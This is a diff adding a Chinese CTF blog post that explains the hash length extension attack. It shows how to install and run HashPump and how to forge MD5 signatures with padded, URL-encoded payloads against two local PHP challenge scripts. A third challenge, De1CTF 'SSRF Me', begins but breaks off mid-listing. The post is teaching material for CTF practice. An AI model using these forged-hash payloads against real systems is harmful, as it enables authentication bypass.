@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>哈希长度扩展攻击以及HashPump安装使用和两道题目 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="&amp;#x80FD;&amp;#x505A;&amp;#x4EC0;&amp;#x4E48;&amp;#x5982;&amp;#x679C;salt&amp;#x7684;&amp;#x503C;&amp;#x4F60;&amp;#x4E0D;&amp;#x77E5;&amp;#x9053;&amp;#xFF0C;&amp;#x4F46;&amp;#x662F;&amp;#x4F60;&amp;#x77E5;&amp;#x9053;&amp;#x957F;&amp;#x5EA6;&amp;#xFF0C;&amp;#x53C8;&amp;#x77E5;&amp;#x9053;sha1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="哈希长度扩展攻击以及HashPump安装使用和两道题目">
+<meta property="og:url" content="http://example.com/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;#x80FD;&amp;#x505A;&amp;#x4EC0;&amp;#x4E48;&amp;#x5982;&amp;#x679C;salt&amp;#x7684;&amp;#x503C;&amp;#x4F60;&amp;#x4E0D;&amp;#x77E5;&amp;#x9053;&amp;#xFF0C;&amp;#x4F46;&amp;#x662F;&amp;#x4F60;&amp;#x77E5;&amp;#x9053;&amp;#x957F;&amp;#x5EA6;&amp;#xFF0C;&amp;#x53C8;&amp;#x77E5;&amp;#x9053;sha1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/2.png">
+<meta property="og:image" content="http://example.com/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/1.png">
+<meta property="article:published_time" content="2019-11-19T06:25:51.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:54:11.511Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/2.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            哈希长度扩展攻击以及HashPump安装使用和两道题目
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-11-19T06:25:51.000Z" itemprop="datePublished">19 Nov 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/CTF/">CTF</a><span>></span><a class="article-category-link" href="/categories/CTF/Crypto/">Crypto</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            14 minutes read (About 2125 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h3 id="&#x80FD;&#x505A;&#x4EC0;&#x4E48;"><a href="#&#x80FD;&#x505A;&#x4EC0;&#x4E48;" class="headerlink" title="&#x80FD;&#x505A;&#x4EC0;&#x4E48;"></a>&#x80FD;&#x505A;&#x4EC0;&#x4E48;</h3><p>&#x5982;&#x679C;salt&#x7684;&#x503C;&#x4F60;&#x4E0D;&#x77E5;&#x9053;&#xFF0C;&#x4F46;&#x662F;&#x4F60;&#x77E5;&#x9053;&#x957F;&#x5EA6;&#xFF0C;&#x53C8;&#x77E5;&#x9053;sha1(salt+&#x201C;&#x4E00;&#x7EC4;&#x6B63;&#x786E;&#x6570;&#x636E;&#x201D;)&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA9;sha1(salt+&#x201C;&#x586B;&#x5145;&#x6570;&#x636E;&#x201D;+&#x201C;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#x6570;&#x636E;&#x201D;)&#x7B49;&#x4E8E;&#x6211;&#x4EEC;&#x7684;sha1(salt+&#x201C;&#x4E00;&#x7EC4;&#x6B63;&#x786E;&#x6570;&#x636E;&#x201D;).&#x8FD9;&#x91CC;&#x7684;salt+&#x201C;&#x586B;&#x5145;&#x6570;&#x636E;&#x201D;&#x5C31;&#x662F;&#x5BF9;salt&#x8FDB;&#x884C;sha1&#x65F6;&#x6240;&#x8865;&#x5168;&#x7684;&#x6570;&#x636E;+&#x6700;&#x540E;8&#x4F4D;&#x7684;&#x957F;&#x5EA6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;salt+&#x201D;&#x586B;&#x5145;&#x6570;&#x636E;&#x201D;&#x7684;&#x957F;&#x5EA6;&#x5C31;&#x662F;64&#x5B57;&#x8282;&#xFF0C;&#x6B63;&#x597D;&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x7EC4;&#x3002;&#x5982;&#x679C;salt&#x7684;&#x957F;&#x5EA6;&#x5C31;&#x5927;&#x4E8E;&#x4E86;56&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x90A3;&#x4E48;&#x52A0;&#x5165;&#x586B;&#x5145;&#x6570;&#x636E;&#x540E;&#x7684;&#x957F;&#x5EA6;&#x5E94;&#x8BE5;&#x662F;N&#x4E2A;64&#x5B57;&#x8282;&#xFF0C;&#x7B49;&#x4E8E;N&#x4E2A;&#x5206;&#x7EC4;&#x3002;<br>&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;&#x4F60;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#xFF0C;sha1&#x7A0B;&#x5E8F;&#x518D;&#x5BF9;&#xFF08;salt+&#x201C;&#x586B;&#x5145;&#x6570;&#x636E;&#x201D;+&#x201C;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#x6570;&#x636E;&#x201D;&#xFF09;&#x8FDB;&#x884C;hash&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x7B2C;&#x4E8C;&#x8F6E;&#x53CA;&#x7B2C;&#x4E8C;&#x8F6E;&#x4EE5;&#x540E;&#x7684;&#x8FD0;&#x7B97;&#x3002;&#x56E0;&#x4E3A;&#x7B2C;&#x4E00;&#x8F6E;&#x8FD0;&#x7B97;&#x540E;&#x7684;registers&#x503C;&#x5C31;&#x662F;sha1(salt)&#x7684;&#x503C;&#xFF0C;&#x8BE5;&#x503C;&#x4F60;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x4E86;&#x3002;</p>
+<a id="more"></a>
+
+
+
+
+<p>&#x4F60;&#x628A;&#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#x7684;<code>&#x201C;1234567890abcdeadminadmin&#x201D;</code>,<code>&quot;memeadmin&quot;</code>&#x60F3;&#x6210;&#x662F;salt,&#x7136;&#x540E;&#x518D;&#x8003;&#x8651;&#x4E0B;&#x5462;&#xFF1F;</p>
+<h3 id="HashPump&#x5B89;&#x88C5;"><a href="#HashPump&#x5B89;&#x88C5;" class="headerlink" title="HashPump&#x5B89;&#x88C5;"></a>HashPump&#x5B89;&#x88C5;</h3><figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5728;&#x6267;&#x884C;make&#x7684;&#x65F6;&#x5019;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;openssl/sha.h&#x6CA1;&#x6709;&#x6587;&#x4EF6;&#x7684;&#x9519;&#x8BEF;<br>&#x90A3;&#x4E48;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssl</span><br><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7136;&#x540E;make &#x548C;make install&#x5373;&#x53EF;<br>&#x4F7F;&#x7528;&#xFF1A;</p>
+<figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;/HashPump$ hashpump</span><br><span class="line">Input Signature: c7813629f22b6a7d28a08041db3e80a9</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 4</span><br><span class="line">Input Data to Add: joychou </span><br><span class="line">06cf5a94dcda53659f58c0f411ba0bd8</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00joychou</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x53C2;&#x6570;&#x8BF4;&#x660E;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">signature&#x6765;&#x81EA;&#x5DF2;&#x77E5;&#x6D88;&#x606F;&#x7684;&#x7B7E;&#x540D;&#x3002;</span><br><span class="line">data&#x6765;&#x81EA;&#x5DF2;&#x77E5;&#x6D88;&#x606F;&#x7684;&#x6570;&#x636E;&#x3002;</span><br><span class="line">additional&#x60A8;&#x8981;&#x6DFB;&#x52A0;&#x5230;&#x5DF2;&#x77E5;&#x6D88;&#x606F;&#x7684;&#x4FE1;&#x606F;&#x3002;</span><br><span class="line">keylength &#x7528;&#x4E8E;&#x5BF9;&#x539F;&#x59CB;&#x6D88;&#x606F;&#x8FDB;&#x884C;&#x7B7E;&#x540D;&#x7684;&#x5BC6;&#x94A5;&#x7684;&#x957F;&#x5EA6;&#xFF08;&#x4EE5;&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;&#xFF09;&#x3002;&#x662F;&#x9664;&#x53BB;&#x4E00;&#x4E2A;admin&#x7684;&#x957F;&#x5EA6;&#xFF08;&#x5177;&#x4F53;&#x770B;&#x9898;&#xFF09;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5F97;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x884C;&#x662F;&#x65B0;&#x7684;hash&#x503C; &#x7B2C;&#x4E8C;&#x884C;&#x662F;payload<br>&#x6216;&#x8005;&#x7528;python&#x5305;</p>
+<h3 id="&#x9898;&#x76EE;"><a href="#&#x9898;&#x76EE;" class="headerlink" title="&#x9898;&#x76EE;"></a>&#x9898;&#x76EE;</h3><h4 id="&#x6D4B;&#x8BD5;"><a href="#&#x6D4B;&#x8BD5;" class="headerlink" title="&#x6D4B;&#x8BD5;"></a>&#x6D4B;&#x8BD5;</h4><p>&#x5176;&#x4E2D;<code>$salt = &quot;meme&quot;;</code>&#x73A9;&#x5BB6;&#x4E0D;&#x53EF;&#x89C1;&#xFF0C;&#x8BA1;&#x7B97;&#x4E0D;&#x80FD;&#x7528;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-variable">$role</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;role&quot;</span>];</span><br><span class="line"><span class="hljs-variable">$hash</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;hash&quot;</span>];</span><br><span class="line"><span class="hljs-variable">$salt</span> = <span class="hljs-string">&quot;meme&quot;</span>; </span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$hash</span> !== md5(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$role</span>)){</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;wrong!&apos;</span>;     </span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line">x</span><br><span class="line"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$role</span> == <span class="hljs-string">&apos;admin&apos;</span>){</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;wrong, hash cann\&apos;t be admin&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are &quot;</span>.<span class="hljs-variable">$role</span>.<span class="hljs-string">&apos;&lt;/br&gt;&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Congradulation!&apos;</span>;</span><br><span class="line"><span class="hljs-comment">//&#x5DF2;&#x77E5;&#x4E00;&#x7EC4;role&#x4E3A;admin&#xFF0C;salt&#x957F;&#x5EA6;&#x4E3A;4&#xFF0C;hash&#x4E3A;c7813629f22b6a7d28a08041db3e80a9</span></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x9996;&#x5148;&#x8BA1;&#x7B97;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ hashpump</span><br><span class="line">Input Signature: c7813629f22b6a7d28a08041db3e80a9</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 4</span><br><span class="line">Input Data to Add: st4ck</span><br><span class="line">92910845adf673d71ca809b196bcab9e</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00st4ck</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7F16;&#x7801;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7136;&#x540E;&#x4F20;&#x53C2;&#xFF0C;&#x7531;&#x4E8E;&#x6CA1;&#x6709;urldecode&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x6700;&#x597D;&#x7528;get,&#x56E0;&#x4E3A;get&#x8BF7;&#x6C42;&#x81EA;&#x5E26;urldecode</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?role=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck</span><br><span class="line">&#x5185;&#x5BB9;&#xFF1A;hash=92910845adf673d71ca809b196bcab9e</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="2.png" alt="img"></p>
+<h4 id="&#x9898;&#x76EE;2-&#x5B9E;&#x9A8C;&#x5427;-&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x672C;&#x5730;&#x6D4B;&#x8BD5;"><a href="#&#x9898;&#x76EE;2-&#x5B9E;&#x9A8C;&#x5427;-&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x672C;&#x5730;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x9898;&#x76EE;2-&#x5B9E;&#x9A8C;&#x5427;-&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x672C;&#x5730;&#x6D4B;&#x8BD5;"></a>&#x9898;&#x76EE;2-&#x5B9E;&#x9A8C;&#x5427;-&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x672C;&#x5730;&#x6D4B;&#x8BD5;</h4><p>&#x5176;&#x4E2D;<code>$secret=&quot;1234567890abcde&quot;;</code>&#x7ED9;&#x73A9;&#x5BB6;&#x4E0D;&#x53EF;&#x89C1;&#xFF0C;&#x8BA1;&#x7B97;&#x4E5F;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x91CC;&#x5C55;&#x793A;&#x51FA;&#x6765;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x672C;&#x5730;&#x64CD;&#x4F5C;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-variable">$secret</span>=<span class="hljs-string">&quot;1234567890abcde&quot;</span>; <span class="hljs-comment">// This secret is 15 characters long for security!</span></span><br><span class="line"><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag{test}&quot;</span>;</span><br><span class="line"><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;getmein&quot;</span>] === md5(<span class="hljs-variable">$secret</span> . urldecode(<span class="hljs-variable">$username</span> . <span class="hljs-variable">$password</span>))){</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! You are a registered user.\n&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The flag is &quot;</span>. <span class="hljs-variable">$flag</span>);</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// md5(1234567890abcdeadminadmin)=93a5e7bea9c040065617b1a62ffc3d72</span></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x9898;&#x76EE;&#x4E2D;&#x80FD;&#x5F97;&#x5230;&#x4FE1;&#x606F;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($secret.<span class="hljs-string">&quot;adminadmin&quot;</span>)&#x7684;&#x503C;&#x4E3A;93a5e7bea9c040065617b1a62ffc3d72</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7A0D;&#x5FAE;&#x6574;&#x7406;&#x4E0B;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x7684;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$secret&#x662F;&#x5BC6;&#x6587;&#xFF0C;&#x957F;&#x5EA6;&#x4E3A;15&#xFF0C;&#x5982;&#x679C;&#x518D;&#x7B97;&#x4E0A;&#x540E;&#x9762;&#x7B2C;&#x4E00;&#x4E2A;admin&#xFF0C;&#x957F;&#x5EA6;&#x5C31;&#x662F;20</span><br><span class="line">&#x800C;&#x6570;&#x636E;&#x662F;admin</span><br><span class="line">&#x7B7E;&#x540D;&#xFF08;&#x54C8;&#x5E0C;&#x503C;&#xFF09;&#x662F;93a5e7bea9c040065617b1a62ffc3d72</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7B2C;&#x4E00;&#x6B65;&#x8BA1;&#x7B97;payload</p>
+<figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ hashpump</span><br><span class="line">Input Signature: 93a5e7bea9c040065617b1a62ffc3d72</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: st4ck</span><br><span class="line">bf3722a5e102e94a83adef7cbf34a30b</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00st4ck</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6362;&#x4E00;&#x4E0B;&#x7F16;&#x7801;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00st4ck&amp;getmein=bf3722a5e102e94a83adef7cbf34a30b</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7531;&#x4E8E;&#x81EA;&#x5E26;urldecode&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xB7;</p>
+<p><img src="1.png" alt="img"></p>
+<h4 id="&#x9898;&#x76EE;3-&#x54C8;&#x5E0C;&#x957F;&#x5EA6;&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x4E4B;De1CTF-SSRF-Me"><a href="#&#x9898;&#x76EE;3-&#x54C8;&#x5E0C;&#x957F;&#x5EA6;&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x4E4B;De1CTF-SSRF-Me" class="headerlink" title="&#x9898;&#x76EE;3-&#x54C8;&#x5E0C;&#x957F;&#x5EA6;&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x4E4B;De1CTF - SSRF Me"></a>&#x9898;&#x76EE;3-&#x54C8;&#x5E0C;&#x957F;&#x5EA6;&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x4E4B;De1CTF - SSRF Me</h4><p>&#x7ED9;&#x51FA;&#x4E86;&#x6E90;&#x7801;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 